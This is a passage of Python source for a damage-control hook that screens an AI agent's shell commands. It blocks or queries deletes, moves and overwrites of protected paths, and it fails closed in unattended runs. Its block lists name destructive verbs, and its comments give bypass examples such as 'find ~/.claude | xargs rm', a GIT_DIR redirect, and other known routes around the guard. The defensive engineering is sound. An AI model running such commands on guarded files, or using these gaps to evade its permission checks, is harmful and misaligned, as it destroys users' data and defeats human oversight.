def _path_literals(path: str) -> Tuple[str, ...]:
    """Case-folded literals of which at least one must occur for ``path`` to match.

    The ``{path}`` regex is quadratic on a long token (#1108): ``[^\\s/]*``
    re-scans the rest of the token from every start position. Every match
    must contain the path's literal text, so a ``casefold`` containment test
    rules the pattern out in O(n) before the regex ever runs. Empty means no
    usable literal (a glob ending in ``*``), i.e. no prefilter.
    """
    if is_glob_pattern(path):
        if '[' in path:
            return ()
        literal = max(re.split(r'[*?]', path), key=len)
        return (literal.casefold(),) if literal else ()
    expanded = os.path.expanduser(path)
    return tuple(dict.fromkeys(
        p.rstrip('/').casefold() for p in (expanded, path) if p.rstrip('/')
    ))


def _may_mention_path(text: str, literals: Tuple[str, ...]) -> bool:
    if not literals:
        return True
    folded = text.casefold()
    return any(lit in folded for lit in literals)


def path_ladder_haystacks(command: str, path: str) -> List[str]:
    """Haystacks for the readOnly/noDelete/protected path ladders (#922).

    The ladder operation patterns pair a destructive VERB with the guarded
    path. Matching them against the raw command let the verb come from quoted
    CONTENT — ``grep -rn "rm file deletion" ~/.agentwire/`` was refused as a
    delete because its search string mentions one (#915's literal incident,
    mechanism 2 of #922). So the ladders read masked subcommands instead: a
    quoted prose span cannot supply the verb. The one refinement over plain
    :func:`masked_subcommands` is the keep-predicate — a content token that
    itself MENTIONS the guarded path stays visible (``rm "~/.agentwire/a b"``
    must still read as a delete of the path), so masking can only ever remove
    verbs that had no business pairing with it.
    """
    try:
        keep = _rx(_path_context_regex(path))
    except re.error:
        return [command]

    literals = _path_literals(path)

    def _mentions_path(token: str) -> bool:
        if not _may_mention_path(token, literals):
            return False
        if keep.search(token):
            return True
        canon = canonicalize_command(token)
        return canon != token and bool(keep.search(canon))

    return masked_subcommands(mask_sed_substitutions(command), keep=_mentions_path)


def check_path_patterns(
    command: str,
    path: str,
    patterns: List[Tuple[str, str]],
    path_type: str,
) -> Tuple[bool, str]:
    """Check if any operation pattern matches ``command`` targeting ``path``.

    Returns ``(matched, reason)`` where reason names the operation that triggered.
    """
    if not _may_mention_path(command, _path_literals(path)):
        return False, ""
    path_regex = _path_context_regex(path)
    for pattern_template, operation in patterns:
        try:
            full_pattern = pattern_template.replace("{path}", path_regex)
            if _rx(full_pattern).search(command):
                return True, f"{operation} operation on {path_type} {path}"
        except re.error:
            continue
    return False, ""


# ----------------------------------------------------------------------------
# Producer-fed deletes (#1128) and moves/overwrites (#1127)
# ----------------------------------------------------------------------------
# The no-delete / read-only ladders pair a destructive VERB with a path in the
# same simple command. A pipe, xargs, a loop or a substitution splits the two:
# ``find ~/.claude | xargs rm`` has the path in one segment and the verb in
# another, and nothing paired them. The scan below finds delete/move consumers
# whose operands come from somewhere else and treats the OTHER segments' words
# as the consumer's operands, so the ladders judge them like direct operands.
# ``mv`` is not a delete verb, but moving a guarded file out of place deletes it
# from where it was guarded, and moving or copying onto one overwrites it.

_DELETE_VERBS = frozenset({"rm", "rmdir", "unlink", "shred"})
_MOVE_VERBS = frozenset({"mv", "rename"})
_COPY_VERBS = frozenset({"cp", "install", "rsync"})
_FEEDERS = frozenset({"xargs", "parallel"})
_PRODUCER_SCAN_VERBS_RE = re.compile(r"\b(?:rm|rmdir|unlink|shred|truncate|dd|mv|rename|cp|install|rsync|ln)\b")
_FEEDER_VALUE_OPTS = frozenset(
    {"-I", "-n", "-P", "-L", "-d", "-E", "-s", "-a", "-J", "-R", "-S", "-j", "-N", "-l", "-i"}
)
_WRAPPER_VALUE_OPTS = frozenset(
    {"-u", "-g", "-h", "-p", "-C", "-D", "-T", "-R", "-n", "-s", "-k", "-c", "-t", "-d", "-S"}
)
_COPY_VALUE_OPTS = frozenset("tSmogeB")
_COPY_LONG_VALUE_OPTS = frozenset({
    "--suffix", "--mode", "--owner", "--group", "--rsh", "--exclude", "--include",
    "--filter", "--files-from", "--exclude-from", "--include-from", "--rsync-path",
    "--temp-dir", "--log-file",
})
_FIND_FILTER_PRIMARIES = frozenset(
    {"-name", "-iname", "-path", "-ipath", "-wholename", "-iwholename", "-regex", "-iregex"}
)
_FIND_EXEC_PRIMARIES = frozenset({"-exec", "-execdir", "-ok", "-okdir"})
_SEARCH_PRODUCERS = frozenset(
    {"find", "ls", "tree", "du", "fd", "fdfind", "rg", "ag", "grep", "egrep", "fgrep", "locate"}
)
_VAR_ASSIGN_WORD_RE = re.compile(r"[A-Za-z_]\w*=")
_GLOB_CHARS_RE = re.compile(r"[*?\[]")


def _is_dynamic_operand(word: str) -> bool:
    """An operand whose value the command text does not carry (variable, substitution, ``{}``)."""
    return "$" in word or "`" in word or "{}" in word or word.endswith(")")


def _command_head(words: List[str]) -> Optional[Tuple[str, List[str], bool]]:
    """``(verb, args, fed_by_stdin)`` of one simple command, wrappers peeled; None if unmodelled."""
    i, n, fed = 0, len(words), False
    while i < n:
        word = words[i]
        base = posixpath.basename(word)
        if _VAR_ASSIGN_WORD_RE.match(word):
            i += 1
        elif base in _PREFIX_WRAPPERS:
            i += 1
            while i < n and (words[i].startswith("-") or re.fullmatch(r"[\d.]+[smhd]?", words[i])):
                opt = words[i]
                i += 1
                if opt in _WRAPPER_VALUE_OPTS and i < n and not words[i].startswith("-"):
                    i += 1
        elif base in _FEEDERS:
            fed = True
            i += 1
            while i < n and words[i].startswith("-"):
                opt = words[i]
                i += 1
                if opt in _FEEDER_VALUE_OPTS and i < n:
                    i += 1
        elif base == "git":
            i += 1
            while i < n and words[i].startswith("-"):
                opt = words[i]
                i += 1
                if opt in {"-C", "-c", "--git-dir", "--work-tree", "--namespace"} and i < n:
                    i += 1
            if i < n and words[i] == "mv":
                return "mv", words[i + 1:], fed
            return None
        else:
            return base, words[i + 1:], fed
    return None


def _split_operands(args: List[str]) -> Tuple[List[str], Optional[str], bool]:
    """``(positional operands, -t/--target-directory value, -T given)`` of an mv/cp-style command."""
    ops: List[str] = []
    target: Optional[str] = None
    no_target = False
    i = 0
    while i < len(args):
        arg = args[i]
        if arg == "--":
            ops.extend(args[i + 1:])
            break
        if arg.startswith("--"):
            name, eq, value = arg.partition("=")
            if name == "--target-directory":
                if eq:
                    target = value
                elif i + 1 < len(args):
                    i += 1
                    target = args[i]
            elif name == "--no-target-directory":
                no_target = True
            elif name in _COPY_LONG_VALUE_OPTS and not eq:
                i += 1
        elif arg.startswith("-") and len(arg) > 1:
            for j, ch in enumerate(arg[1:], 1):
                if ch == "T":
                    no_target = True
                elif ch in _COPY_VALUE_OPTS:
                    rest = arg[j + 1:]
                    value = rest or (args[i + 1] if i + 1 < len(args) else None)
                    if not rest:
                        i += 1
                    if ch == "t":
                        target = value
                    break
        else:
            ops.append(arg)
        i += 1
    return ops, target, no_target


class _GuardedOp:
    """One delete/move/overwrite consumer: what leaves its place, what is written over."""

    __slots__ = ("sources", "dests", "fed", "operands", "relocates", "strict")

    def __init__(
        self, sources: List[str], dests: List[str], fed: bool, operands: List[str],
        relocates: bool = True, strict: bool = False,
    ):
        self.sources, self.dests, self.fed, self.operands = sources, dests, fed, operands
        self.relocates, self.strict = relocates, strict  # mv/cp-style; plain deletes are the regex ladder's job


def _truncate_operands(args: List[str]) -> List[str]:
    ops: List[str] = []
    skip = False
    for a in args:
        if skip:
            skip = False
        elif a in ("-s", "-r", "--size", "--reference"):
            skip = True
        elif not (a.startswith("-") and a != "-"):
            ops.append(a)
    return ops


def _classify_guarded_op(
    words: List[str], find_fed: bool = False, strict: bool = False
) -> Optional[_GuardedOp]:
    head = _command_head(words)
    if head is None:
        return None
    verb, args, via_feeder = head
    fed = via_feeder or find_fed
    if via_feeder and " " in verb.strip():
        # `parallel 'rm {}' ::: x`: the quoted word is the command line itself.
        try:
            nested = shlex.split(verb) + args
        except ValueError:
            return None
        return _classify_guarded_op(nested, find_fed=True, strict=strict)
    if verb in _DELETE_VERBS or verb == "truncate":
        ops = _truncate_operands(args) if verb == "truncate" else [
            a for a in args if not (a.startswith("-") and a != "-")
        ]
        return _GuardedOp(
            ops, [], fed or any(_is_dynamic_operand(o) for o in ops), ops, relocates=False, strict=strict
        )
    if verb == "dd":
        ops = [a[3:] for a in args if a.startswith("of=")]
        return _GuardedOp(
            ops, [], fed or any(_is_dynamic_operand(o) for o in ops), ops, relocates=False, strict=strict
        )
    if verb in _MOVE_VERBS or verb in _COPY_VERBS or (verb == "ln" and any(
        a.startswith("-") and not a.startswith("--") and "f" in a or a == "--force" for a in args
    )):
        ops, target, no_target = _split_operands(args)
        if verb == "rename":
            return _GuardedOp(ops, [], fed or any(_is_dynamic_operand(o) for o in ops), ops, strict=strict)
        if target is not None:
            srcs, dests = ops, [target]
        elif len(ops) >= 2 or no_target:
            srcs, dests = ops[:-1], ops[-1:]
        else:
            srcs, dests = [], ops
        if verb in _COPY_VERBS or verb == "ln":
            srcs = []
        dynamic = any(_is_dynamic_operand(o) for o in srcs + dests)
        return _GuardedOp(
            srcs, dests, fed or dynamic, ops + ([target] if target else []), strict=strict
        )
    if verb == "find":
        for i, w in enumerate(args):
            if w in _FIND_EXEC_PRIMARIES:
                nested = []
                for t in args[i + 1:]:
                    if t in (";", "+"):
                        break
                    nested.append(t)
                return _classify_guarded_op(nested, find_fed=True, strict=w != "-exec")
    return None


class _ProducerScan:
    """What the command's consumers can be fed, and the direct mv/cp operands."""

    __slots__ = ("pool", "searches", "direct", "deletes", "moves", "strict")

    def __init__(self) -> None:
        self.pool: List[str] = []
        self.searches: List[Tuple[List[str], List[str], bool]] = []
        self.direct: List[_GuardedOp] = []
        self.deletes = False  # a fed rm/truncate/dd consumer is present
        self.moves = False  # a fed mv/rename consumer is present
        self.strict = False  # fed through find -execdir/-ok/-okdir: a "possible" is a block

    def __bool__(self) -> bool:
        return bool(self.pool or self.direct)


_GIT_PRODUCER_SUBCOMMANDS = frozenset({"ls-files", "ls-tree", "status", "diff", "grep", "log", "show"})


def _git_producer(head_args: List[str]) -> Optional[Tuple[List[str], List[str], bool]]:
    """``(roots, filters, implicit_cwd)`` of ``git [-C dir] ls-files …``-style producers."""
    roots: List[str] = []
    i = 0
    while i < len(head_args) and head_args[i].startswith("-"):
        opt = head_args[i]
        i += 1
        if opt in {"-C", "-c", "--git-dir", "--work-tree"} and i < len(head_args):
            if opt in ("-C", "--work-tree"):
                roots.append(head_args[i])
            i += 1
    if i >= len(head_args) or head_args[i] not in _GIT_PRODUCER_SUBCOMMANDS:
        return None
    for a in head_args[i + 1:]:
        if not a.startswith("-"):
            roots.append(a)
    return roots, [], not roots


def _search_roots(head: str, args: List[str]) -> Tuple[List[str], List[str], bool]:
    """``(roots, name filters, implicit_cwd)`` of a search producer's argument list."""
    filters: List[str] = []
    positional: List[str] = []
    recursive = head in {"rg", "ag", "find", "ls", "tree", "du", "fd", "fdfind", "locate"}
    expr_started = False
    i = 0
    while i < len(args):
        a = args[i]
        if head == "find" and (a.startswith("-") or a in ("(", "!")):
            expr_started = True
        if head == "find" and expr_started:
            if a in _FIND_FILTER_PRIMARIES and i + 1 < len(args):
                filters.append(args[i + 1])
            i += 1
            continue
        if a.startswith("-") and len(a) > 1:
            if head in {"grep", "egrep", "fgrep"} and re.fullmatch(r"-[A-Za-z]*[rR][A-Za-z]*|--recursive", a):
                recursive = True
            i += 1
            continue
        positional.append(a)
        i += 1
    if head in {"grep", "egrep", "fgrep", "rg", "ag", "fd", "fdfind", "locate"} and positional:
        positional = positional[1:]  # the pattern, not a root
    roots = [p for p in positional if not p.startswith("-")]
    return roots, filters, (not roots and recursive)


def _producer_head(words: List[str]) -> Optional[Tuple[List[str], List[str], bool]]:
    """Search roots of a producer segment, or None when it is not a search."""
    i = 0
    while i < len(words) and (_VAR_ASSIGN_WORD_RE.match(words[i]) or words[i] in _PREFIX_WRAPPERS):
        i += 1
    if i >= len(words):
        return None
    verb, args = posixpath.basename(words[i]), words[i + 1:]
    if verb == "git":
        return _git_producer(args)
    if verb in _SEARCH_PRODUCERS:
        return _search_roots(verb, args)
    return None


def producer_scan(command: str) -> _ProducerScan:
    """Find consumers fed from elsewhere (and direct mv/cp operands) in ``command``."""
    scan = _ProducerScan()
    if not _PRODUCER_SCAN_VERBS_RE.search(command):
        return scan
    segments = _masked_subcommand_words(mask_sed_substitutions(command), keep=lambda _t: True)
    ops = [_classify_guarded_op(words) for words in segments]
    for words, op in zip(segments, ops):
        if op is None:
            continue
        if op.fed:
            if op.relocates:
                scan.moves = True
            else:
                scan.deletes = True
            scan.strict = scan.strict or op.strict
        elif op.relocates:
            scan.direct.append(op)
    if not (scan.deletes or scan.moves):
        return scan
    for words, op in zip(segments, ops):
        head = _command_head(words)
        if op is not None and op.fed:
            scan.pool.extend(op.operands)
            if ":::" in words or "::::" in words:
                scan.pool.extend(words)
            if head is None or head[0] != "find":
                continue  # `find ... -exec rm` is both producer and consumer
        scan.pool.extend(words)
        found = _producer_head(words)
        if found is not None:
            scan.searches.append(found)
    return scan


def _expand_scan_word(word: str) -> str:
    return os.path.expanduser(canonicalize_command(word.strip("'\"")))


def _prefix_may_reach(root: str, entry_abs: str) -> bool:
    """True when the directory ``root`` is (or contains) ``entry_abs``."""
    root = root.rstrip("/") or "/"
    if _GLOB_CHARS_RE.search(root):
        parts = entry_abs.strip("/").split("/")
        return any(
            fnmatch.fnmatchcase("/" + "/".join(parts[:k]), root) for k in range(1, len(parts) + 1)
        )
    return root == "/" or entry_abs == root or entry_abs.startswith(root + "/")


def producer_may_emit(scan: _ProducerScan, path: str, cwd: Optional[str]) -> Optional[str]:
    """``"named"`` / ``"possible"`` / None: could a search producer emit a guarded file?

    The producer's output is unknown, so a root that IS or contains the guarded
    path, a variable-valued root, or a name filter that could match a guarded
    basename counts. A literal root equal to or inside the guarded path is as
    good as naming it (``named``); a root that merely contains it, or a
    relative root that resolves into it, is ``possible``. A producer with no
    protected argument, run from an unguarded cwd, is not a hit.
    """
    expanded = os.path.expanduser(path)
    is_dir = expanded.endswith("/")
    entry = expanded.rstrip("/")
    leaf = posixpath.basename(entry)
    absolute = entry.startswith("/")
    best: Optional[str] = None
    for roots, filters, implicit in scan.searches:
        raw_roots = [_expand_scan_word(r) for r in roots] or (["."] if implicit else [])
        name_filters = [_expand_scan_word(f) for f in filters]
        filter_could_match = (not name_filters) or any(
            fnmatch.fnmatchcase(leaf, posixpath.basename(f)) for f in name_filters
        )
        for root in raw_roots:
            if "$" in root or "`" in root:
                return "possible"  # a root held in a variable cannot be resolved
            literal_root = root.startswith("/")
            if literal_root:
                root_abs = posixpath.normpath(root)
            elif cwd:
                root_abs = posixpath.normpath(posixpath.join(cwd, root))
            else:
                continue
            if not absolute:
                continue  # bare names are matched by the filter/glob scan below
            if not _prefix_may_reach(root_abs, entry):
                continue
            if not (is_dir or filter_could_match):
                continue
            inside = root_abs == entry or root_abs.startswith(entry + "/")
            if inside and literal_root:
                return "named"
            best = "possible"
    # A bare-name entry (`README.md`) can only be reached through a glob/filter
    # when the producer works from the cwd; a search rooted at literal absolute
    # directories elsewhere is judged by those roots instead.
    rooted_elsewhere = bool(scan.searches) and all(
        roots and all(_expand_scan_word(r).startswith("/") for r in roots)
        for roots, _filters, _implicit in scan.searches
    )
    for word in () if rooted_elsewhere else scan.pool:
        w = _expand_scan_word(word)
        if not absolute and "/" not in entry and _GLOB_CHARS_RE.search(w) and fnmatch.fnmatchcase(leaf, posixpath.basename(w)):
            return "possible"
    return best


def producer_fed_hit(scan: _ProducerScan, path: str, patterns, cwd: Optional[str]) -> Optional[str]:
    """``"named"`` / ``"possible"`` / None: does a fed consumer reach the guarded ``path``?

    A directory entry guards runtime state agents legitimately move, so only a
    fed DELETE consumer reaches it; a fed mv reaches the file entries.
    """
    if not scan.pool:
        return None
    if path.endswith("/") and not scan.deletes:
        return None
    hay = "rm " + canonicalize_command(" ".join(scan.pool))
    if check_path_patterns(hay, path, patterns, "producer-fed")[0]:
        return "named"
    hit = producer_may_emit(scan, path, cwd)
    if hit == "possible" and scan.strict:
        return "named"  # find -execdir/-ok/-okdir rm: same verdict as -exec rm
    return hit


def _operand_hits(word: str, path: str) -> bool:
    return check_path_patterns("rm " + canonicalize_command(word.strip("'\"")), path, DELETE_PATTERNS, "")[0]


def _resolve_operand(word: str, cwd: Optional[str]) -> Optional[str]:
    target = _expand_scan_word(word)
    if target.startswith("/"):
        return posixpath.normpath(target)
    return posixpath.normpath(posixpath.join(cwd, target)) if cwd else None


def move_overwrite_hit(scan: _ProducerScan, path: str, cwd: Optional[str]) -> Optional[Tuple[str, str]]:
    """``(kind, why)`` when a direct mv/cp/install/rsync/ln -f/rename touches the no-delete ``path``.

    ``kind`` is ``block`` or ``ask``. A SOURCE that is (or contains) a guarded
    path leaves its place — moving a guarded directory deletes everything in
    it. A DESTINATION that names a guarded FILE entry is overwritten. A
    directory entry guards runtime state (cohorts, inbox, sessions…) that
    agents move and replace as a matter of course, so only the directory
    ITSELF (or an ancestor) counts for it; files inside are not in the mv
    ladder. Renaming a guarded file inside its own directory is an ``ask``.
    """
    is_dir_entry = path.endswith("/")
    expanded = os.path.expanduser(path).rstrip("/")
    entry_abs = expanded if expanded.startswith("/") else (
        posixpath.normpath(posixpath.join(cwd, expanded)) if cwd else None
    )
    leaf = posixpath.basename(expanded)
    for op in scan.direct:
        for src in op.sources:
            if _is_dynamic_operand(src):
                continue
            src_abs = _resolve_operand(src, cwd)
            names_file = not is_dir_entry and _operand_hits(src, path)
            holds = (
                entry_abs is not None and src_abs is not None and _prefix_may_reach(src_abs, entry_abs)
            ) or (
                not is_dir_entry and _GLOB_CHARS_RE.search(src) is not None
                and fnmatch.fnmatchcase(leaf, posixpath.basename(src))
            )
            if not (names_file or holds):
                continue
            if names_file and src_abs is not None:
                for dest in op.dests:
                    dest_abs = _resolve_operand(dest, cwd)
                    if dest_abs is not None and posixpath.dirname(dest_abs) == posixpath.dirname(src_abs):
                        return "ask", "renamed inside its own directory"
            return "block", "moved out of place"
        if is_dir_entry:
            continue
        for dest in op.dests:
            if not _is_dynamic_operand(dest) and not dest.endswith("/") and _operand_hits(dest, path):
                return "block", "overwritten"
    return None


# ============================================================================
# CONFIG LOADING
# ============================================================================


# Terminator for a generated command prefix. ``\b`` is NOT enough: it matches
# between a word char and ``-``, so ``\bgit\s+merge\b`` swallowed the read-only
# ``git merge-base`` and refused it as a merge (#933). The lookahead forbids the
# last token being EXTENDED by another command-name char.
_CMD_PREFIX_TERM = r'(?![\w-])'


def _cmd_fixed_tokens(cmd: str, include_flags: bool = False) -> Tuple[str, ...]:
    """The leading literal tokens of a tooldef ``cmd:`` string.

    Stops at the first placeholder (``<...>``) or optional (``[...]``); flags
    (``-``/``--``) also stop it unless ``include_flags`` — read-command prefixes
    keep their literal flags (``git checkout -- <file>``) so a write rule can
    exclude them precisely.
    """
    fixed = []
    for token in cmd.strip().split():
        if token.startswith('<') or token.startswith('['):
            break
        if not include_flags and token.startswith('-'):
            break
        fixed.append(token)
    return tuple(fixed)


def _cmd_to_regex(
    cmd: str,
    read_prefixes: Tuple[Tuple[str, ...], ...] = (),
) -> Optional[str]:
    """Convert a tooldef command string to a regex matching its fixed prefix.

    Example: ``gh pr create --title <t>`` ->
    ``\\bgh\\s+pr\\s+create(?![\\w-])``

    ``read_prefixes`` are the token prefixes of the same tooldef's
    ``access: read`` commands. Any read command that EXTENDS this write prefix
    contributes a negative lookahead, so the write rule stops swallowing the
    read-only subcommand that shares its spelling — ``git stash`` (write) no
    longer refuses ``git stash list`` (read) (#933). The exclusion is
    data-driven from the tooldef itself: declaring a subcommand ``access: read``
    is what releases it.
    """
    fixed = _cmd_fixed_tokens(cmd)
    if not fixed:
        return None
    parts = [re.escape(t) for t in fixed]
    pattern = r'\b' + r'\s+'.join(parts)
    continuations = sorted({
        r[len(fixed)]
        for r in read_prefixes
        if len(r) > len(fixed) and r[:len(fixed)] == fixed
    })
    if continuations:
        alts = []
        for tok in continuations:
            alt = re.escape(tok)
            if tok and (tok[-1].isalnum() or tok[-1] == '_'):
                alt += _CMD_PREFIX_TERM
            alts.append(alt)
        pattern += r'(?!\s+(?:' + '|'.join(alts) + r'))'
    last = fixed[-1]
    if last and (last[-1].isalnum() or last[-1] == '_'):
        pattern += _CMD_PREFIX_TERM
    return pattern


def _record_load_failure(
    path: Path, exc: BaseException, failures: Optional[List[Dict[str, Any]]]
) -> None:
    """Say out loud that a rule/tooldef file was skipped (#1130).

    A file that fails to parse contributes NOTHING, so every protection in it is
    silently absent — indistinguishable from a healthy set (#885's shape).
    Names the file and, for a YAML error, the line; goes to stderr and into
    ``failures`` so ``agentwire doctor`` can report it too.
    """
    mark = getattr(exc, "problem_mark", None)
    line = mark.line + 1 if mark is not None else None
    detail = getattr(exc, "problem", None) or str(exc) or type(exc).__name__
    where = f"{path}:{line}" if line else str(path)
    try:
        print(f"agentwire damage-control: SKIPPED {where}: {detail}", file=sys.stderr)
    except Exception:
        # A dead stderr must not turn a reporting line into a changed verdict.
        pass
    if failures is not None:
        failures.append({"file": str(path), "line": line, "error": str(detail)})


def load_write_patterns_from_tooldefs(
    tooldefs_dir: Optional[Path],
    failures: Optional[List[Dict[str, Any]]] = None,
) -> List[Dict[str, Any]]:
    """Generate ``ask:true`` patterns from write-tier commands in tooldef YAMLs."""
    if not yaml:
        return []
    patterns: List[Dict[str, Any]] = []
    if not tooldefs_dir or not tooldefs_dir.exists():
        return patterns
    for tf_file in sorted(tooldefs_dir.glob("*.yaml")):
        try:
            with open(tf_file, "r") as f:
                data = yaml.safe_load(f) or {}
            tool_name = data.get("name", tf_file.stem)
            commands = data.get("commands", [])
            # ``access: read`` prefixes carve read-only subcommands OUT of the
            # write rules generated below (#933) — see _cmd_to_regex.
            read_prefixes = tuple(
                p for p in (
                    _cmd_fixed_tokens(c.get("cmd", ""), include_flags=True)
                    for c in commands
                    if isinstance(c, dict) and c.get("access") == "read"
                ) if p
            )
            for cmd_def in commands:
                if cmd_def.get("access") != "write":
                    continue
                cmd_str = cmd_def.get("cmd", "")
                regex = _cmd_to_regex(cmd_str, read_prefixes)
                if not regex:
                    continue
                entry = {
                    "pattern": regex,
                    "reason": f"{tool_name}: {cmd_def.get('description', cmd_str)}",
                    "ask": True,
                    # Command-prefix rule: match command position only, never
                    # quoted argument/message content (#675).
                    "anchored": True,
                }
                # An explicit ``id:`` on the tooldef command yields a stable
                # rule ID (e.g. ``git.push``) that survives description edits —
                # needed so ``safety.unattended_allow`` can name it reliably.
                # Without one, ``_assign_rule_id`` derives a slug from the reason.
                if cmd_def.get("id"):
                    entry["id"] = str(cmd_def["id"])
                patterns.append(entry)
        except Exception as exc:
            _record_load_failure(tf_file, exc, failures)
    return patterns


_RULE_ID_SLUG_RE = re.compile(r"[^a-z0-9]+")


def _slug_for_rule(text: str, max_len: int = 60) -> str:
    """Lowercase, ASCII, kebab-case slug suitable for rule IDs."""
    s = _RULE_ID_SLUG_RE.sub("-", (text or "").lower()).strip("-")
    return s[:max_len] or "rule"


def _assign_rule_id(
    pattern_obj: Dict[str, Any],
    file_stem: str,
    taken: set,
    duplicates: Optional[set] = None,
) -> str:
    """Generate (or honor) an ID for a bash pattern. Mutates pattern_obj in place.

    A DERIVED id is de-conflicted with a ``-2`` suffix, but an EXPLICIT ``id:``
    is honored verbatim — pinning is the whole point, and renaming one would
    silently break the ``disabled_rules`` / ``unattended_allow`` entry that names
    it. So collisions are possible, and they are never benign: two live rules
    sharing one id makes both of those knobs ambiguous, and ambiguity on the
    surface #914's scoped grants are built on is not something to discover from
    behaviour. Collisions are recorded in ``duplicates`` and surfaced by
    ``agentwire doctor`` / ``safety status`` / ``safety lint`` (#916).

    A duplicate id is also the ONLY detector for a partially-applied rule set: a
    new bundled file landing next to a stale one that still carries the same
    pinned ids is otherwise invisible.
    """
    existing = pattern_obj.get("id")
    if isinstance(existing, str) and existing.strip():
        pattern_obj["id"] = existing.strip()
        if pattern_obj["id"] in taken and duplicates is not None:
            duplicates.add(pattern_obj["id"])
        taken.add(pattern_obj["id"])
        return pattern_obj["id"]
    slug = _slug_for_rule(pattern_obj.get("reason", "rule"))
    candidate = f"{file_stem}.{slug}"
    n = 2
    while candidate in taken:
        candidate = f"{file_stem}.{slug}-{n}"
        n += 1
    pattern_obj["id"] = candidate
    taken.add(candidate)
    return candidate


def load_config(
    rules_dir: Any,
    tooldefs_dir: Optional[Path] = None,
) -> Dict[str, Any]:
    """Load and merge all rule YAMLs in ``rules_dir`` plus tooldef ask-patterns.

    ``rules_dir`` is one directory or a list of them (the bundled generic rules and
    the AgentWire layer). Files merge in sorted FILE-NAME order across all of them,
    exactly as if they sat in one flat directory.

    Bash patterns get a stable ``id`` field (``"<file>.<slug-of-reason>"``) so
    they can be referenced by the ``safety.disabled_rules`` config.
    """
    merged: Dict[str, Any] = {
        "bashToolPatterns": [],
        "mcpToolPolicies": [],
        "zeroAccessPaths": [],
        "readOnlyPaths": [],
        "noDeletePaths": [],
        "allowedPaths": [],
    }
    if not yaml:
        # No YAML parser ⇒ we cannot load ANY rules. Returning the empty rule set
        # would silently disable all protection (fail OPEN). Mark the config so
        # the decision ladder fails CLOSED instead.
        merged["_parser_unavailable"] = "pyyaml unavailable — cannot load rules"
        return merged
    rules_dirs = [rules_dir] if isinstance(rules_dir, Path) else list(rules_dir)
    if not any(d.exists() for d in rules_dirs):
        return merged
    taken_ids: set = set()
    duplicate_ids: set = set()
    parse_failures: List[Dict[str, Any]] = []
    yaml_files = sorted((f for d in rules_dirs for f in d.glob("*.yaml")), key=lambda f: f.name)
    for rules_file in yaml_files:
        try:
            with open(rules_file, "r") as f:
                data = yaml.safe_load(f) or {}
            for key in merged:
                items = data.get(key, []) or []
                if key in ("bashToolPatterns", "mcpToolPolicies"):
                    for it in items:
                        if isinstance(it, dict):
                            _assign_rule_id(it, rules_file.stem, taken_ids, duplicate_ids)
                            it.setdefault("source", rules_file.stem)
                merged[key].extend(items)
        except Exception as exc:
            _record_load_failure(rules_file, exc, parse_failures)
    if tooldefs_dir is not None:
        tooldef_patterns = load_write_patterns_from_tooldefs(tooldefs_dir, parse_failures)
        for it in tooldef_patterns:
            _assign_rule_id(it, "tooldef", taken_ids, duplicate_ids)
            it.setdefault("source", "tooldef")
        merged["bashToolPatterns"].extend(tooldef_patterns)
    # Only present when something is actually wrong, so the healthy merged
    # config keeps exactly the keys it always had.
    if duplicate_ids:
        merged["_duplicate_rule_ids"] = sorted(duplicate_ids)
    if parse_failures:
        merged["_parse_failures"] = parse_failures
    return merged


# ============================================================================
# UNATTENDED (NO-HUMAN-PRESENT) RESOLUTION
# ============================================================================
#
# The damage-control hook classifies commands into allow / block / ask. The
# ``ask`` tier only means something when a human is present to confirm. Under
# the scheduler (cron, nobody watching) sessions run with
# ``--dangerously-skip-permissions``, so historically ``ask`` resolved to a
# SILENT allow — an unsupervised agent could deploy / drop a table / force-push.
#
# When a session is marked unattended (``AGENTWIRE_UNATTENDED=1``, stamped at
# dispatch by the scheduler), the hook resolves ``ask`` by FAILING CLOSED:
# block + notify the owner, UNLESS the matched rule's stable ID carries a GRANT.
# Grants come from three sources, most specific first:
#   1. ``AGENTWIRE_UNATTENDED_ALLOW`` — the per-task extension the scheduler
#      stamps from a task's ``unattended_allow``,
#   2. ``safety.unattended_allow`` from the host-owned damage-control files,
#   3. ``DEFAULT_UNATTENDED_ALLOW`` below (work + open a PR + notify the owner
#      by email — nothing else irreversible or outward-facing).
#
# PRECEDENCE, NOT UNION (#914): the most specific source that NAMES a rule id
# defines that rule's grant outright. A union would make the whole point of a
# scoped entry unexpressible — ``git.commit`` is already granted unscoped by the
# default set, so a task writing ``{id: git.commit, paths: [<store>]}`` under a
# union would read as a constraint and be silently meaningless. That class of
# config-that-lies is exactly what this issue is about, so naming a rule at a
# more specific level REPLACES the looser grant for that dispatch. Within one
# source, several entries for the same id union their scopes.
#
# SCOPES (#914). A grant entry is either a bare rule id (unscoped — the rule is
# permitted wherever it fires) or a mapping carrying ``paths``:
#
#     unattended_allow:
#       - outbound.agentwire-email                  # bare: unchanged, still works
#       - id: tooldef.git-create-a-commit
#         paths:
#           - ~/.claude/projects/*/memory/          # scoped: only under here
#
# A scoped grant applies only when EVERY directory the matching command would
# act on resolves inside one of ``paths``. Scope evaluation can only ever
# REFUSE a command the bare grant would have allowed; it can never permit one.
#
# WHAT IT REFUSES RATHER THAN GUESSES — an enumerated list, not a guarantee.
# ``command_scope_dirs`` refuses on: a ``cd`` not joined by ``&&``; an indirect
# runner (``sh -c``, ``xargs``, ``sudo``, ``ssh`` …); a subshell/group;
# ``eval`` / a base64 pipeline; command substitution IN A DIRECTORY-DECIDING
# POSITION (a ``cd`` target, a ``-C``/``--git-dir``/``--work-tree`` value, a
# ``GIT_DIR``-family assignment, the segment head, a git config key) — a
# substitution in an operand such as a ``-m`` message cannot move the command
# and no longer refuses (#942/#943); a ``core.worktree``/``include.*`` config
# set on the command line (``-c``/``--config-env``); an unrecognized
# environment assignment; and a rule whose pattern matches no single segment.
# It READS, rather than refuses: the cwd, ``cd <literal> &&``, git's ``-C`` /
# ``--git-dir`` / ``--work-tree``, git's ``GIT_DIR``-family environment
# assignments, the enclosing git repo root, and that root's ``core.worktree``
# redirect (#927 — measured against the scope like any other selector).
#
# That list is the honest form of the claim. An earlier draft of this comment
# said "anything that makes the target directory unknowable does not apply the
# grant", which was not true of the code beneath it: ``GIT_DIR=<other> git
# commit`` was stripped as an environment assignment and silently measured
# against the cwd — the PR reproducing the very defect class it exists to fix
# (#913 is "the rule matched a phrasing, not an operation"; this matched the
# ``-C`` phrasing and missed the assignment spelling of the same redirection,
# while the ``env(1)`` spelling was already refused). Enumerate what is handled;
# do not assert a closure property over shell semantics.
#
# NOT closed, and stated so rather than implied:
#   * The ``git config core.worktree`` REDIRECT command itself is still
#     unruled (rule-file territory, #927) — but the escape it enabled is
